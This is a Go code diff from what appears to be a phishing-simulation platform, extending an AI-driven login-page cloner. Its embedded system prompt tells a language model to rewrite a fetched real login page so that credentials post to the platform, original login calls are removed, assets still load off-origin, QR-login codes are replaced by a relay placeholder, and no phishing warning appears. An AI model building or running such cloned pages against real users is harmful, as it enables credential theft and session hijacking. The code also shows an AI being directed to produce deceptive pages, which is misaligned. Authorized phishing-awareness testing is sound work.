@@ -35,15 +35,19 @@ type MirrorRewriteInput struct {
 	SubmitURL    string
 	RedirectURL  string
 	OriginalHost string
+	// OriginalURL is the final page URL after redirects (scheme+host+path), used to
+	// absolutize relative CSS/JS/image references so previews work off-origin.
+	OriginalURL string
 }
 
 // MirrorSystemPrompt is the locked system instruction for login-page rewrite.
 const MirrorSystemPrompt = `你是钓鱼演练平台的 HTML 改写助手。
 你的唯一任务：在尽量保持页面外观与文案不变的前提下，
-把登录相关提交改写为发送到指定的我方接收地址，并统一使用平台接收字段。
+把登录相关提交改写为发送到指定的我方接收地址，并统一使用平台接收字段；
+同时保证样式与静态资源在离开原站域名后仍能加载。
 
 硬性规则：
-1. 保留原有布局、样式、文案、图片引用，不要重写整页。
+1. 保留原有布局、样式、文案、图片引用，不要重写整页、不要删掉原有 <link rel="stylesheet"> / 外链脚本 / 背景图。
 2. 将所有登录相关 <form> 的 action 改为字面量 {{SUBMIT_URL}}（必须含花括号，不要改成 http(s) 或 /api/submit）；method 使用 POST（若原本是 GET 登录也改为 POST）。
 3. 平台接收字段（必须遵守）：
    - username：账号/用户名/手机号/邮箱等登录标识，统一使用 name="username"
@@ -58,23 +62,42 @@ const MirrorSystemPrompt = `你是钓鱼演练平台的 HTML 改写助手。
 5. 能明确识别为登录提交的 fetch/axios/XMLHttpRequest，改为请求字面量 {{SUBMIT_URL}}。
 6. 删除或改写会把凭据提交到原站域名的登录逻辑；不要保留可用的原站登录 API 调用。
 7. 提交成功后的跳转改为字面量 {{REDIRECT_URL}}（不要写死真实网站；项目构建时会替换。若项目未填原始链接则停留当前页并显示简单成功提示）。
-8. 不要把 project_id、ip_address 做成用户可见输入框；这些由平台侧处理。
-9. 不要加入明显的“这是钓鱼页”文案；不要添加与任务无关的脚本。
-10. 只输出完整 HTML 文档，不要 Markdown，不要代码围栏，不要解释。`
+8. 静态资源绝对化（必须做，否则在本平台预览会丢 CSS）：
+   - 依据 ORIGINAL_URL（完整页面地址）与 ORIGINAL_HOST，把页面中的相对资源改成可访问的绝对 URL
+   - 覆盖：<link href> 样式表、<script src>、<img src>、<source src>、poster、favicon，以及 style / <style> 里的 url(...)
+   - 根路径如 /ekp/resource/a.css → https://ORIGINAL_HOST/ekp/resource/a.css（保留 query）
+   - 相对路径如 css/a.css、../img/a.png → 相对 ORIGINAL_URL 解析成绝对地址
+   - 协议相对 //cdn.example/a.css → 补上与 ORIGINAL_URL 相同的 https: 或 http:
+   - 已是 http(s):、data:、javascript:、mailto:、#锚点，以及字面量 {{SUBMIT_URL}} / {{REDIRECT_URL}} → 不要改
+   - 不要把登录提交地址改回原站；不要用 <base href> 偷懒（禁止新增指向原站的 <base>）
+   - 不要删除 stylesheet；不要把外链 CSS 改成空或 inline 瞎编样式
+9. 不要把 project_id、ip_address 做成用户可见输入框；这些由平台侧处理。
+10. 不要加入明显的“这是钓鱼页”文案；不要添加与任务无关的脚本。
+11. 只输出完整 HTML 文档，不要 Markdown，不要代码围栏，不要解释。
+12. 如果页面包含二维码 / 扫码登录图片（<img> 或 canvas），把该二维码元素替换为字面量 {{QR_RELAY_IMG}}；不要保留原二维码图片或链接；其它图片不要替换。二维码由项目绑定的 QR Relay 在构建/启动时注入。如果保留 <img> 标签，src 必须使用 {{QR_RELAY_URL}}，不要把 {{QR_RELAY_IMG}} 放进 src。`
 
 // BuildMirrorUserPrompt builds the user message for rewrite.
 func BuildMirrorUserPrompt(in MirrorRewriteInput) string {
 	submit := LandingSubmitToken(in.SubmitURL)
 	redirect := LandingRedirectToken(in.RedirectURL)
+	host := strings.TrimSpace(in.OriginalHost)
+	originURL := strings.TrimSpace(in.OriginalURL)
+	if originURL == "" && host != "" {
+		originURL = "https://" + host + "/"
+	}
 	var b strings.Builder
 	b.WriteString("SUBMIT_URL: ")
 	b.WriteString(submit)
 	b.WriteString("\nREDIRECT_URL: ")
 	b.WriteString(redirect)
 	b.WriteString("\nORIGINAL_HOST: ")
-	b.WriteString(strings.TrimSpace(in.OriginalHost))
+	b.WriteString(host)
+	b.WriteString("\nORIGINAL_URL: ")
+	b.WriteString(originURL)
 	b.WriteString("\n\n平台字段：\n- username\n- password\n- captchavalue（可选）\n\n")
 	b.WriteString("请将页面登录相关输入字段统一改成上述 name，并保证提交到字面量 {{SUBMIT_URL}}（项目构建时再替换为启动地址）。\n")
+	b.WriteString("如果页面有二维码/扫码登录图片，请将该元素替换为字面量 {{QR_RELAY_IMG}}，不要保留原二维码图片或链接。\n")
+	b.WriteString("同时：按 ORIGINAL_URL / ORIGINAL_HOST 把 CSS、JS、图片等相对资源改成绝对 URL，避免在本平台打开时样式丢失；不要改动 {{SUBMIT_URL}} / {{REDIRECT_URL}}。\n")
 	b.WriteString("下面是抓取到的原始 HTML。请按系统规则改写后返回完整 HTML：\n\n")
 	b.WriteString(in.RawHTML)
 	return b.String()
@@ -82,6 +105,9 @@ func BuildMirrorUserPrompt(in MirrorRewriteInput) string {
 
 // StripHeavyBase64DataURIs replaces oversized inline images with placeholders to reduce tokens.
 func StripHeavyBase64DataURIs(html string) string {
+	if IsQRScreenshotPage(html) {
+		return html
+	}
 	html = base64DataURIRe.ReplaceAllString(html, `$1="$2[STRIPPED_FOR_AI]"`)
 	return cssBase64DataURIRe.ReplaceAllString(html, `url($1[STRIPPED_FOR_AI])`)
 }
@@ -151,17 +177,26 @@ func FetchURLHTML(ctx context.Context, rawURL string, timeout time.Duration) (ht
 		return "", nil, err
 	}
 	ct := strings.ToLower(resp.Header.Get("Content-Type"))
+	final := resp.Request.URL
+	if strings.HasPrefix(ct, "image/") || ct == "" {
+		if _, ok := QRCodeContent(body); ok {
+			return QRCodePageHTML(), final, nil
+		}
+		if strings.HasPrefix(ct, "image/") {
+			return "", nil, fmt.Errorf("upstream image is not a QR code: %s", ct)
+		}
+	}
 	if ct != "" && !strings.Contains(ct, "html") && !strings.Contains(ct, "text/plain") {
 		return "", nil, fmt.Errorf("upstream content-type is not html: %s", ct)
 	}
-	final := resp.Request.URL
 	return string(body), final, nil
 }
 
 type chatCompletionRequest struct {
 	Model       string        `json:"model"`
 	Messages    []chatMessage `json:"messages"`
-	Temperature float64       `json:"temperature"`
+	Temperature float64       `json:"temperature,omitempty"`
+	MaxTokens   int           `json:"max_tokens,omitempty"`
 }
 
 type chatMessage struct {
@@ -175,6 +210,7 @@ type chatCompletionResponse struct {
 			Content string `json:"content"`
 		} `json:"message"`
 	} `json:"choices"`
+	Usage aiUsageJSON `json:"usage"`
 	// Some providers return error as object; others as a plain string.
 	Error json.RawMessage `json:"error"`
 }
@@ -201,6 +237,11 @@ func NormalizeOpenAICompatibleBaseURL(baseURL string) string {
 	return u
 }
 
+// ProbeChatCompletions is the OpenAI-compatible compatibility wrapper.
+func ProbeChatCompletions(ctx context.Context, baseURL, apiKey, model string, timeout time.Duration) (ProbeChatCompletionsResult, error) {
+	return ProbeChatCompletionsFormat(ctx, AIAPIFormatOpenAI, baseURL, apiKey, model, timeout)
+}
+
 // ProbeChatCompletionsResult is returned by ProbeChatCompletions.
 type ProbeChatCompletionsResult struct {
 	Endpoint   string `json:"endpoint"`
@@ -211,7 +252,7 @@ type ProbeChatCompletionsResult struct {
 
 // ProbeChatCompletions sends a minimal chat/completions request to verify
 // base_url + api_key + model connectivity for AI Settings.
-func ProbeChatCompletions(ctx context.Context, baseURL, apiKey, model string, timeout time.Duration) (ProbeChatCompletionsResult, error) {
+func probeChatCompletionsOpenAI(ctx context.Context, baseURL, apiKey, model string, timeout time.Duration) (ProbeChatCompletionsResult, error) {
 	out := ProbeChatCompletionsResult{Model: strings.TrimSpace(model)}
 	if strings.TrimSpace(apiKey) == "" {
 		return out, fmt.Errorf("API key is required")
@@ -271,21 +312,36 @@ func ProbeChatCompletions(ctx context.Context, baseURL, apiKey, model string, ti
 	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
 		return out, formatAIHTTPError(resp.StatusCode, endpoint, truncateForErr(string(body), 300))
 	}
+	recordAIUsage(ctx, parsed.Usage.normalized())
 	return out, nil
 }
 
-// RewriteHTMLWithAI calls an OpenAI-compatible chat completions endpoint.
+// RewriteHTMLWithAI is the OpenAI-compatible compatibility wrapper.
 func RewriteHTMLWithAI(ctx context.Context, baseURL, apiKey, model string, timeout time.Duration, in MirrorRewriteInput) (string, error) {
+	return RewriteHTMLWithAIFormat(ctx, AIAPIFormatOpenAI, baseURL, apiKey, model, timeout, in)
+}
+
+// RewriteHTMLWithAIFormat mirrors a page through the selected AI wire format.
+func RewriteHTMLWithAIFormat(ctx context.Context, apiFormat, baseURL, apiKey, model string, timeout time.Duration, in MirrorRewriteInput) (string, error) {
 	if strings.TrimSpace(apiKey) == "" {
 		return "", fmt.Errorf("AI API key is not configured")
 	}
 	if strings.TrimSpace(model) == "" {
 		model = defaultAIModelFallback()
 	}
-	baseURL = NormalizeOpenAICompatibleBaseURL(baseURL)
+	apiFormat = AIAPIFormatOrDefault(apiFormat)
+	baseURL = NormalizeAIBaseURL(apiFormat, baseURL)
 	if baseURL == "" {
 		return "", fmt.Errorf("AI base URL is not configured")
 	}
+	if IsDirectQRPage(in.RawHTML) {
+		return StripDirectQRMarker(in.RawHTML), nil
+	}
+	if IsQRScreenshotPage(in.RawHTML) {
+		return StripQRScreenshotMarker(in.RawHTML), nil
+	}
+	in.RawHTML = ReplaceQRCodeImages(ctx, in.RawHTML, in.OriginalURL)
+	hadQRPlaceholder := strings.Contains(in.RawHTML, PlaceholderQRRelayImg) || strings.Contains(in.RawHTML, PlaceholderQRRelayURL)
 	if timeout <= 0 {
 		timeout = defaultAIRewriteTimeout
 	}
@@ -295,56 +351,30 @@ func RewriteHTMLWithAI(ctx context.Context, baseURL, apiKey, model string, timeo
 		defer cancel()
 	}
 
-	endpoint := baseURL + "/chat/completions"
-	payload := chatCompletionRequest{
-		Model: model,
-		Messages: []chatMessage{
-			{Role: "system", Content: MirrorSystemPrompt},
-			{Role: "user", Content: BuildMirrorUserPrompt(in)},
-		},
-		Temperature: 0.1,
-	}
-	raw, err := json.Marshal(payload)
+	result, err := CompleteAITextFormat(
+		ctx,
+		apiFormat,
+		baseURL,
+		apiKey,
+		model,
+		timeout,
+		MirrorSystemPrompt,
+		BuildMirrorUserPrompt(in),
+		4096,
+		0.1,
+	)
 	if err != nil {
-		return "", err
+		return "", wrapAIRewriteTransportErr(result.Endpoint, timeout, len(in.RawHTML), err)
 	}
-
-	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(raw))
-	if err != nil {
-		return "", err
+	if strings.TrimSpace(result.Text) == "" {
+		return "", fmt.Errorf("AI returned empty content from %s", result.Endpoint)
 	}
-	req.Header.Set("Authorization", "Bearer "+apiKey)
-	req.Header.Set("Content-Type", "application/json")
-
-	// Do not set Client.Timeout: it races the request context and commonly
-	// dies mid-body while a large rewritten HTML document is still streaming.
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", wrapAIRewriteTransportErr(endpoint, timeout, len(in.RawHTML), err)
+	html := normalizeAIHTMLOutput(result.Text)
+	html = NormalizeQRPlaceholderUsage(html)
+	html = ReplaceQRCodeImages(ctx, html, in.OriginalURL)
+	if hadQRPlaceholder && !strings.Contains(html, PlaceholderQRRelayImg) && !strings.Contains(html, PlaceholderQRRelayURL) {
+		html = injectQRPlaceholder(html)
 	}
-	defer resp.Body.Close()
-	body, err := io.ReadAll(io.LimitReader(resp.Body, maxAIRewriteResponse))
-	if err != nil {
-		return "", wrapAIRewriteTransportErr(endpoint, timeout, len(in.RawHTML), err)
-	}
-	var parsed chatCompletionResponse
-	if err := json.Unmarshal(body, &parsed); err != nil {
-		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-			return "", fmt.Errorf("AI request failed (HTTP %d) %s: %s", resp.StatusCode, endpoint, truncateForErr(string(body), 300))
-		}
-		return "", fmt.Errorf("invalid AI response from %s: %w", endpoint, err)
-	}
-	if errMsg := extractAIErrorMessage(parsed.Error); errMsg != "" {
-		return "", formatAIHTTPError(resp.StatusCode, endpoint, errMsg)
-	}
-	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-		return "", formatAIHTTPError(resp.StatusCode, endpoint, truncateForErr(string(body), 300))
-	}
-	if len(parsed.Choices) == 0 || strings.TrimSpace(parsed.Choices[0].Message.Content) == "" {
-		return "", fmt.Errorf("AI returned empty content from %s", endpoint)
-	}
-	html := normalizeAIHTMLOutput(parsed.Choices[0].Message.Content)
 	return NormalizeRewrittenLoginHTML(html, LandingSubmitToken(in.SubmitURL)), nil
 }
 
@@ -420,6 +450,10 @@ func extractAIErrorMessage(raw json.RawMessage) string {
 // ValidateRewrittenHTML performs lightweight acceptance checks.
 func ValidateRewrittenHTML(html, submitURL string) error {
 	htmlLower := strings.ToLower(html)
+	qrPage := strings.Contains(html, PlaceholderQRRelayImg) || strings.Contains(html, PlaceholderQRRelayURL)
+	if qrPage && !hasLoginField(htmlLower, "username") && !hasLoginField(htmlLower, "password") {
+		return nil
+	}
 	submit := strings.TrimSpace(submitURL)
 	if submit == "" {
 		submit = DefaultMirrorSubmitURL
